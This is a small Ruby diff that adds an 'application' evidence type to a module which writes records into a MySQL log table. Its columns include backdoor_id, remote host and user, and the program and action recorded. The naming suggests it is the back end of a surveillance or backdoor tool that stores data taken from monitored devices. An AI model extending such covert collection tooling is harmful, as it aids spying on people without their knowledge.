@@ -232,6 +232,20 @@ module Evidence
                  '#{@mysql.escape(evidence.info[:md5])}',
                  #{evidence.info[:size]},
                  '#{@mysql.escape(evidence.info[:content])}')"
+        when :APPLICATION
+        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, longtext1)
+                 VALUES (0,
+                 '#{@mysql.escape(evidence.info[:type].to_s)}',
+                 1,
+                 #{evidence.info[:backdoor_id]},
+                 '#{@mysql.escape(evidence.info[:source_id])}',
+                 '#{@mysql.escape(evidence.info[:device_id])}',
+                 '#{@mysql.escape(evidence.info[:user_id])}',
+                 '#{@mysql.escape(evidence.info[:received].to_s)}',
+                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
+                 '#{@mysql.escape(evidence.info[:program])}',
+                 '#{@mysql.escape(evidence.info[:action])}',
+                 '#{@mysql.escape(evidence.info[:info])}')"
       else
         trace :debug, "Not implemented."
         return nil
